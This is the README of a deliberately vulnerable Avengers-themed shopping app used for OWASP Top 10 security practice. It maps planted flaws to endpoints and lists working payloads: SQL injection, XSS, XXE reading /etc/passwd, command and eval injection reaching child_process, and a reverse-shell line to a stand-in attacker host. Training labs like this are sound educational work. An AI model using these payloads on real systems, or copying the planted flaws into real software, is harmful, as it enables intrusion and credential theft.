# ⚔️ Avengers Armory - OWASP Top 10 Security Lab

> **Earth's Mightiest Marketplace — with Earth's Worst Security Flaws!**

A deliberately vulnerable web application themed as an **Avengers shopping cart**, designed for security enthusiasts to practice exploiting the **OWASP Top 10 (2021)** vulnerabilities in a safe, legal environment.

## 🚀 Quick Start

```bash
# Install dependencies
npm install

# Start the server
npm start

# Open in browser
open http://localhost:3000
```

## 🔐 Test Accounts

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin123` | 👑 Admin |
| `tony` | `ironman` | User |
| `steve` | `america` | User |
| `thor` | `odin123` | User |
| `natasha` | `widow` | User |
| `bruce` | `hulk` | User |
| `peter` | `spidey` | User |

## 🎯 OWASP Top 10 Vulnerability Map

### A01 - Broken Access Control 🔓
| Endpoint | Vulnerability |
|----------|---------------|
| `/cart?user=X` | **IDOR** — View any user's cart by changing `user` param |
| `/orders?user=X` | **IDOR** — View any user's orders by changing `user` param |
| `/admin` | **Cookie bypass** — Set `user_role=admin` cookie for admin access |
| `/api/download?file=` | **Path Traversal** — Read any server file! `?file=../../config.js` |
| `/.env` | **Forced Browsing** — Hidden secrets exposed |
| `/api/cors-test` | **CORS Misconfig** — Any origin can read sensitive data |
| `/admin/users/delete/:id` | **Privilege Escalation** — Delete any user if admin |

### A02 - Cryptographic Failures 🔐
| Endpoint | Vulnerability |
|----------|---------------|
| Database | **Plaintext passwords** — All passwords stored in cleartext |
| Cookies | **Passwords in cookies** — `user_password` cookie exposed |
| Session | **Weak secret** — `avengers123` guessable session secret |
| Reset | **MD5 hashing** — Password reset uses weak MD5 hashing |
| Cookies | **No security flags** — No `httpOnly`, `secure`, or `SameSite` |
| Transport | **No HTTPS enforced** — All traffic unencrypted |

### A03 - Injection 💉
| Endpoint | Vulnerability |
|----------|---------------|
| `/search?q=` | **SQL Injection** — `' OR '1'='1` dumps all products |
| `/products?category=` | **SQL Injection** — `Weapons' OR '1'='1` bypasses filter |
| `/login` | **SQL Injection** — `admin' --` logs in without password |
| `/products/:id` | **SQL Injection** — Numeric ID injection |
| `/api/sqli/union` | **UNION SQLi** — Extract passwords via UNION SELECT |
| `/products/:id/review` | **SQL Injection + Stored XSS** — Double whammy |
| `/feedback` | **Stored XSS** — `<script>alert('XSS')</script>` persists |
| `/xss/search?q=` | **Reflected XSS** — Direct HTML injection |
| `/api/tools/ping?host=` | **Command Injection** — `localhost;id` executes `id` command |
| `/api/tools/curl` | **Command Injection** — `$(whoami)` in target field |

### A04 - Insecure Design 🏗️
| Endpoint | Vulnerability |
|----------|---------------|
| `/profile/update` | **Mass Assignment** — Set `is_admin=1` or `role=admin` |
| `/profile/change-password` | **No Current Password** — Changes password without verification |
| `/rate-limit-demo/vote` | **No Rate Limiting** — Vote unlimited times |
| `/checkout/coupon` | **Coupon Abuse** — `HACKME` gives 100% off, reusable indefinitely |
| `/api/price-override` | **Price Manipulation** — Client sets the price, server trusts it |
| `/register` | **Weak Password Policy** — No strength requirements, `123` works |

### A05 - Security Misconfiguration ⚙️
| Endpoint | Vulnerability |
|----------|---------------|
| `/debug` | **Sensitive Data Exposure** — All passwords, config, secrets |
| `/static/` | **Directory Listing** — All public files enumerated |
| `/config.js` | **Source Code Exposure** — Config file accessible |
| `admin/admin123` | **Default Credentials** — Never changed from default |
| Error pages | **Stack Traces** — Verbose errors leak file paths |
| All responses | **Version Disclosure** — `X-Powered-By` leaks Express version |
| Cookies | **Insecure Cookie Flags** — No Secure/HttpOnly |

### A06 - Vulnerable Components 📦
| Endpoint | Vulnerability |
|----------|---------------|
| `/api/legacy/parse-xml` | **XXE** — Parse XML with DOCTYPE + SYSTEM to read local files |
| `/api/legacy/products` | **Legacy API** — Deprecated endpoint with known issues |
| `/api/check-versions` | **Known CVEs** — Express 4.16.0, axios 0.21.0 with public exploits |
| Dependencies | **Outdated** — Uses Express 4.16.0 with CVE-2022-24999 |

### A07 - Authentication Failures 🚪
| Endpoint | Vulnerability |
|----------|---------------|
| `/login` | **User Enumeration** — "User not found" vs "Invalid password" messages |
| `/login` | **No Account Lockout** — Brute force unlimited times |
| `/login` | **Session Fixation** — Session ID unchanged after login |
| `/reset-password` | **Predictable Tokens** — Token = MD5(email), no expiry |
| `/register` | **Weak Passwords** — `ironman`, `spidey`, `123` all accepted |
| Everywhere | **No MFA** — No multi-factor authentication anywhere |

### A08 - Integrity Failures 📝
| Endpoint | Vulnerability |
|----------|---------------|
| `/suit-config?config=` | **Eval Injection / RCE** — JavaScript executes via `eval()` |
| `/api/deserialize?raw=` | **Insecure Deserialization / RCE** — Raw expressions evaluated |
| `/integrity` | **Unsigned Packages** — Install packages without signature verification |
| `/api/check-update` | **Auto-Update No Verify** — Downloads from untrusted source |

### A09 - Logging & Monitoring Failures 👁️‍🗨️
| Endpoint | Vulnerability |
|----------|---------------|
| `/api/transfer` | **No Audit Trail** — Financial transfers with zero logging |
| `/admin/no-audit/action` | **No Admin Audit** — Admin actions not recorded |
| `/login` | **Login Failures Not Logged** — Brute force attempts leave no trace |
| `/api/audit-trail` | **Empty Logs** — No monitoring infrastructure exists |

### A10 - Server-Side Request Forgery 🕸️
| Endpoint | Vulnerability |
|----------|---------------|
| `/avatar/fetch` | **SSRF** — Fetch any URL server-side |
| `/api/ssrf/probe` | **Blind SSRF** — Probe internal services |
| `/ssrf-guide` | **SSRF Guide** — Cloud metadata, port scanning, chains |
| `169.254.169.254` | **Cloud Metadata** — AWS/GCP/Azure if deployed |

### 🎯 Suggested Chain Attacks
1. **SSRF → Debug → Admin**: Fetch `/avatar/fetch` → `http://localhost:3000/debug` → get admin password → login
2. **SQLi → UNION → All Data**: `/api/sqli/union?col=id,username,password` → dump all credentials
3. **Command Injection → Reverse Shell**: `/api/tools/ping?host=;bash -c 'exec bash -i &>/dev/tcp/attacker/443 <&1'`
4. **Eval Injection → Read Config**: `/suit-config?config={toString:process.mainModule.require("child_process").execSync("cat config.js").toString()}`
5. **Insecure Deserialization → RCE**: `POST /api/deserialize?raw={r:require('child_process').execSync('id').toString()}`
6. **XXE → File Read**: POST XML with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` to `/api/legacy/parse-xml`
7. **Mass Assignment → Admin → Delete Users**: Update profile with `is_admin=1` → access admin panel → delete users

## 🛠️ Tools & Techniques to Practice

| Vulnerability | Recommended Tools |
|---------------|------------------|
| SQL Injection | `sqlmap`, Burp Suite Repeater, manual `curl` |
| XSS | Browser DevTools, Burp Suite, custom payloads |
| IDOR | Burp Suite, manual parameter tampering |
| SSRF | `curl`, `nc`, Burp Collaborator |
| Mass Assignment | Burp Repeater, custom HTTP clients |
| Authentication | Hydra, Burp Intruder, manual testing |

### Advanced Payloads

```sql
-- Dump all products via SQLi
' OR '1'='1

-- Login bypass
admin' --

-- UNION injection
' UNION SELECT id,username,password,email,1,NULL,'user',NULL FROM users --

-- Command injection
; id
`id`
$(id)
| id
```

```html
<!-- Stored XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(document.cookie)>

<!-- XXE payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

```javascript
// Eval injection RCE
{toString:process.mainModule.require('child_process').execSync('id').toString()}

// Insecure deserialization RCE
{r: require('fs').readFileSync('/etc/passwd','utf8')}
{r: require('child_process').execSync('id').toString()}
```

## 🛠️ Tools to Practice With

| Vulnerability | Tool | Command |
|---------------|------|---------|
| SQL Injection | sqlmap | `sqlmap -u "http://localhost:3000/products?category=*"` |
| SQL Injection | Burp Suite | Repeater / Intruder for manual testing |
| XSS | Browser DevTools | Test payloads in feedback/review forms |
| Command Injection | curl | `curl "http://localhost:3000/api/tools/ping?host=;id"` |
| SSRF | curl | `curl -X POST -d "url=http://localhost:3000/debug" http://localhost:3000/avatar/fetch` |
| Path Traversal | curl | `curl "http://localhost:3000/api/download?file=../../config.js"` |
| XXE | curl | `curl -X POST -H "Content-Type: text/xml" -d '<?xml...' http://localhost:3000/api/legacy/parse-xml` |
| Mass Assignment | curl | `curl -X POST -d "is_admin=1&role=admin" http://localhost:3000/profile/update` |
| Deserialization | curl | `curl -X POST "http://localhost:3000/api/deserialize?raw={r:require('child_process').execSync('id').toString()}"` |

## 🏰 Challenge Progression

### 🟢 Beginner Level
1. **SQL Injection**: Use `' OR '1'='1` in the search box to see all products
2. **IDOR**: Change `?user=1` in `/cart` URL to view admin's cart
3. **User Enumeration**: Try login with `unknownuser` vs `tony` — notice different error messages
4. **Reflected XSS**: Visit `/xss/search?q=<script>alert(1)</script>`

### 🟡 Intermediate Level
5. **Stored XSS**: Submit `<script>alert(document.cookie)</script>` in feedback
6. **Mass Assignment**: Update profile with `is_admin=1` to become admin
7. **Admin Cookie Bypass**: Set `user_role=admin` cookie in DevTools → access `/admin`
8. **Password Change Exploit**: Change password without current password at `/profile/change-password`
9. **Weak Password Reset**: Calculate MD5 of any user's email to reset their password

### 🔴 Advanced Level
10. **SSRF → Admin Chain**: Use avatar fetch to get `http://localhost:3000/debug` → steal admin creds
11. **Path Traversal**: Read `/api/download?file=../../config.js`
12. **Command Injection**: `curl 'http://localhost:3000/api/tools/ping?host=;id'`
13. **XXE File Read**: POST XML with DOCTYPE + SYSTEM entity to `/api/legacy/parse-xml`
14. **Insecure Deserialization RCE**: `curl -X POST 'http://localhost:3000/api/deserialize?raw={r:require("child_process").execSync("id").toString()}'`
15. **Eval Injection RCE**: `/suit-config?config={toString:process.mainModule.require('child_process').execSync('id').toString()}`
16. **Full Chain Attack**: SSRF → Debug → Admin → Delete users → Profit

## ⚠️ Important Notes

- **DO NOT** deploy this application to a public server or production environment
- **DO NOT** use real credentials or personal data
- This app is for **educational purposes only**
- SQLite database clears on restart (Supabase is persistent)

## 🗄️ Supabase PostgreSQL Setup (Optional)

The app runs on **SQLite** by default (zero config). To use your **Supabase PostgreSQL** database:

```bash
# Set your Management API token (from supabase.com dashboard dev tools)
export SUPABASE_MGMT_TOKEN="your-token"
npm start
```

Edit `config.js` to set `usePostgres: true`.

> ⚠️ **Note:** The Management API token expires every ~30 min. Re-supply via env var when needed.

---

## 📚 Resources

- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Supabase Documentation](https://supabase.com/docs)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

<p align="center">Made with ⚡ by the Avengers Armory Team</p>
<p align="center"><em>Not affiliated with Marvel Entertainment</em></p>
